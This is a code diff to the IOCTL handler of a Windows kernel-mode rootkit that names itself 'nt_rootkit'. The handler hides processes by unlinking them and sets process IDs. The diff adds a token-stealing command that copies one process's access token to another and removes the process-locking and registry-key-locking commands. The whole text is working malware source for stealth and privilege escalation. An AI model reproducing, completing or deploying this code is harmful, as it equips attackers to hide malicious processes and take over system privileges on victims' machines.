@@ -40,15 +40,18 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
 
         switch (io_stack->Parameters.DeviceIoControl.IoControlCode) {
         case IO_HIDE_PROC:
+        {
                 DbgPrint(DRIVER_PREFIX "recieved %s",
-                         (CHAR*)irp->AssociatedIrp.SystemBuffer);
+                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 ULONG pid;
                 RtlCharToInteger(
                         irp->AssociatedIrp.SystemBuffer, 10, &pid);
                 proc_unlink(pid);
                 response = "nt_rootkit: process hidden";
                 break;
+        }
         case IO_PID_PROC:
+        {
                 DbgPrint(DRIVER_PREFIX "recieved %s",
                         (CHAR*)irp->AssociatedIrp.SystemBuffer);
                 ULONG set_pid;
@@ -57,21 +60,17 @@ NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp)
                 proc_set_pid(set_pid);
                 response = "nt_rootkit: process id set";
                 break;
-        case IO_LOCK_PROC:
-                DbgPrint(DRIVER_PREFIX "recieved %s",
-                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
-                lock_proc((HANDLE)irp->AssociatedIrp.SystemBuffer);
-                response = "nt_rootkit: process locked";
+        }
+        case IO_TOKEN_PROC:
+        {
+                token_steal data = 
+                        *(token_steal*)irp->AssociatedIrp.SystemBuffer;
+                DbgPrint(DRIVER_PREFIX "src pid: %d dest pid: %d", 
+                        data.src, data.dest);
+                proc_token_steal(data.src, data.dest);
+                response = "nt_rootkit: token written";
                 break;
-        case IO_LOCK_KEY:
-                DbgPrint(DRIVER_PREFIX "recieved %s",
-                        (CHAR*)irp->AssociatedIrp.SystemBuffer);
-                UNICODE_STRING key;
-                RtlAnsiStringToUnicodeString(&key, 
-                        irp->AssociatedIrp.SystemBuffer, 1);
-                lock_key(&key);
-                response = "nt_rootkit: regkey locked";
-                break;
+        }
         default:
                 break;
         }
